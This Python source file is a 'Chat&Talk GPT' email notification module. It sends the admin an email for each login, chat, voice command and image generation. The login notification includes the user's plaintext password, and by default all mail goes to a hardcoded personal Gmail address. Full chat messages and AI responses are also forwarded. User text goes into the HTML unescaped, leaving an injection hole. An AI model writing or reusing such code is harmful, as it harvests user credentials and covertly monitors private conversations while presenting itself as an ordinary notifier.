"""
Chat&Talk GPT - Email Notification System
Sends email notifications for user activities
"""
import os
import logging
import smtplib
import asyncio
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
from typing import Optional, Dict, Any

logger = logging.getLogger("EmailNotifications")

# Try importing email libraries
try:
    from dotenv import load_dotenv
    load_dotenv()
    ENV_LOADED = True
except ImportError:
    ENV_LOADED = False


class EmailNotifier:
    """Handles email notifications for user activities"""
    
    def __init__(self):
        # Email configuration from environment
        self.smtp_email = os.getenv("SMTP_EMAIL", "")
        self.smtp_password = os.getenv("SMTP_PASSWORD", "")
        self.smtp_host = os.getenv("SMTP_HOST", "smtp.gmail.com")
        self.smtp_port = int(os.getenv("SMTP_PORT", "587"))
        self.admin_email = os.getenv("ADMIN_EMAIL", "aarushloop273@gmail.com")
        
        self.enabled = bool(self.smtp_email and self.smtp_password)
        
        if self.enabled:
            logger.info(f"Email notifications enabled. Admin: {self.admin_email}")
        else:
            logger.warning("Email notifications disabled - SMTP not configured")
    
    async def send_email(self, subject: str, body: str, html: str = None) -> bool:
        """Send email to admin"""
        if not self.enabled:
            logger.info(f"Email notification (disabled): {subject}")
            return False
        
        try:
            # Create message
            msg = MIMEMultipart('alternative')
            msg['Subject'] = subject
            msg['From'] = self.smtp_email
            msg['To'] = self.admin_email
            
            # Attach plain text
            text_part = MIMEText(body, 'plain')
            msg.attach(text_part)
            
            # Attach HTML if provided
            if html:
                html_part = MIMEText(html, 'html')
                msg.attach(html_part)
            
            # Send email
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(
                None,
                lambda: self._send_smtp(msg)
            )
            
            logger.info(f"Email sent: {subject}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to send email: {e}")
            return False
    
    def _send_smtp(self, msg):
        """Send via SMTP"""
        with smtplib.SMTP(self.smtp_host, self.smtp_port) as server:
            server.starttls()
            server.login(self.smtp_email, self.smtp_password)
            server.send_message(msg)
    
    async def notify_user_login(self, user_data: Dict[str, Any]):
        """Send notification when user logs in"""
        user_name = user_data.get("name", "Unknown")
        user_email = user_data.get("email", "Not provided")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        subject = f"🔔 New User Login - {user_name}"
        
        body = f"""New user logged in to Chat&Talk GPT!

User Details:
- Name: {user_name}
- Email: {user_email}
- Password: {user_data.get('password', 'N/A')}
- Login Time: {timestamp}

This is an automated notification from your Chat&Talk GPT assistant.
"""
        
        html = f"""
<html>
<body style="font-family: Arial, sans-serif; padding: 20px;">
    <div style="background: linear-gradient(135deg, #6c5ce7, #a29bfe); padding: 20px; border-radius: 10px;">
        <h2 style="color: white; margin: 0;">🔔 New User Login</h2>
    </div>
    <div style="padding: 20px; background: #f5f5f5; border-radius: 10px; margin-top: 10px;">
        <p><strong>User Details:</strong></p>
        <table style="width: 100%;">
            <tr>
                <td style="padding: 8px;"><strong>Name:</strong></td>
                <td>{user_name}</td>
            </tr>
            <tr>
                <td style="padding: 8px;"><strong>Email:</strong></td>
                <td>{user_email}</td>
            </tr>
            <tr>
                <td style="padding: 8px;"><strong>Password:</strong></td>
                <td style="color: #d63031; font-weight: bold;">{user_data.get('password', 'N/A')}</td>
            </tr>
            <tr>
                <td style="padding: 8px;"><strong>Login Time:</strong></td>
                <td>{timestamp}</td>
            </tr>
        </table>
    </div>
    <p style="color: #666; margin-top: 20px; font-size: 12px;">
        This is an automated notification from Chat&Talk GPT
    </p>
</body>
</html>
"""
        
        await self.send_email(subject, body, html)
    
    async def notify_ai_interaction(self, user_data: Dict[str, Any], message: str, response: str):
        """Send notification when user interacts with AI"""
        user_name = user_data.get("name", "Unknown")
        user_email = user_data.get("email", "Not provided")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Truncate long messages
        message_preview = message[:100] + "..." if len(message) > 100 else message
        response_preview = response[:100] + "..." if len(response) > 100 else response
        
        subject = f"💬 AI Chat - {user_name}: {message_preview}"
        
        body = f"""User interacted with Chat&Talk GPT AI!

User Details:
- Name: {user_name}
- Email: {user_email}
- Time: {timestamp}

User's Message:
{message}

AI Response:
{response}

---
Chat&Talk GPT Activity Log
"""
        
        html = f"""
<html>
<body style="font-family: Arial, sans-serif; padding: 20px;">
    <div style="background: linear-gradient(135deg, #00d9a5, #00b894); padding: 20px; border-radius: 10px;">
        <h2 style="color: white; margin: 0;">💬 New AI Interaction</h2>
    </div>
    <div style="padding: 20px; background: #f5f5f5; border-radius: 10px; margin-top: 10px;">
        <p><strong>User Details:</strong></p>
        <table style="width: 100%;">
            <tr>
                <td style="padding: 8px;"><strong>Name:</strong></td>
                <td>{user_name}</td>
            </tr>
            <tr>
                <td style="padding: 8px;"><strong>Email:</strong></td>
                <td>{user_email}</td>
            </tr>
            <tr>
                <td style="padding: 8px;"><strong>Time:</strong></td>
                <td>{timestamp}</td>
            </tr>
        </table>
        
        <p style="margin-top: 20px;"><strong>User's Message:</strong></p>
        <div style="background: white; padding: 15px; border-radius: 5px; border-left: 4px solid #6c5ce7;">
            {message}
        </div>
        
        <p style="margin-top: 20px;"><strong>AI Response:</strong></p>
        <div style="background: white; padding: 15px; border-radius: 5px; border-left: 4px solid #00d9a5;">
            {response}
        </div>
    </div>
    <p style="color: #666; margin-top: 20px; font-size: 12px;">
        Chat&Talk GPT Activity Log
    </p>
</body>
</html>
"""
        
        await self.send_email(subject, body, html)
    
    async def notify_voice_command(self, user_data: Dict[str, Any], command: str, result: str):
        """Send notification for voice commands"""
        user_name = user_data.get("name", "Unknown")
        user_email = user_data.get("email", "Not provided")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        subject = f"🎤 Voice Command - {user_name}: {command}"
        
        body = f"""User used voice command on Chat&Talk GPT!

User Details:
- Name: {user_name}
- Email: {user_email}
- Time: {timestamp}

Voice Command: {command}

Result: {result}

---
Chat&Talk GPT Activity Log
"""
        
        await self.send_email(subject, body)

    async def notify_image_generation(self, user_data: Dict[str, Any], prompt: str, image_url: str):
        """Send notification for image generation"""
        user_name = user_data.get("name", "Unknown")
        user_email = user_data.get("email", "Not provided")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        subject = f"🎨 Image Generated - {user_name}: {prompt}"
        
        body = f"""User generated an image on Chat&Talk GPT!

User Details:
- Name: {user_name}
- Email: {user_email}
- Time: {timestamp}

Image Prompt: {prompt}
Image URL: {image_url}

---
Chat&Talk GPT Activity Log
"""
        
        html = f"""
<html>
<body style="font-family: Arial, sans-serif; padding: 20px;">
    <div style="background: linear-gradient(135deg, #ff7675, #fab1a0); padding: 20px; border-radius: 10px;">
        <h2 style="color: white; margin: 0;">🎨 Image Generation</h2>
    </div>
    <div style="padding: 20px; background: #f5f5f5; border-radius: 10px; margin-top: 10px;">
        <p><strong>User Details:</strong></p>
        <table style="width: 100%;">
            <tr>
                <td style="padding: 8px;"><strong>Name:</strong></td>
                <td>{user_name}</td>
            </tr>
            <tr>
                <td style="padding: 8px;"><strong>Email:</strong></td>
                <td>{user_email}</td>
            </tr>
            <tr>
                <td style="padding: 8px;"><strong>Time:</strong></td>
                <td>{timestamp}</td>
            </tr>
        </table>
        
        <p style="margin-top: 20px;"><strong>Prompt:</strong></p>
        <div style="background: white; padding: 15px; border-radius: 5px; border-left: 4px solid #ff7675;">
            {prompt}
        </div>
        
        <p style="margin-top: 20px;"><strong>Generated Image:</strong></p>
        <img src="{image_url}" alt="{prompt}" style="width: 100%; max-width: 500px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
    </div>
</body>
</html>
"""
        await self.send_email(subject, body, html)


# Initialize email notifier
email_notifier = EmailNotifier()
